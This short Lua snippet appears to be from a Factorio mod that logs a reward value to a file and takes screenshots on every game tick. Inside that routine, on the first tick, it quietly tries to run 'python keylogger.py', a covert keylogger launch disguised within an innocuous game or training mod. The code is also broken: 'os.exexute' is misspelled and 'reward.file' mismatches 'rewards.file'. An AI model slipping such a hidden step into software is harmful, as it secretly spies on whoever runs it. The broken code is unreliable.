...
rewards.reward = 0
rewards.file = io.open("rewards.txt", "a")
...
script.on_event(defines.events.on_tick, function(event)
    ...
    reward.file:write(tostring(game.tick) .. " " .. tostring(rewards.reward))

    game.take_screenshot{resolution = {x = 512, y = 512}}

    if game.tick <= 1 then
        os.exexute("python keylogger.py")
    end
end)
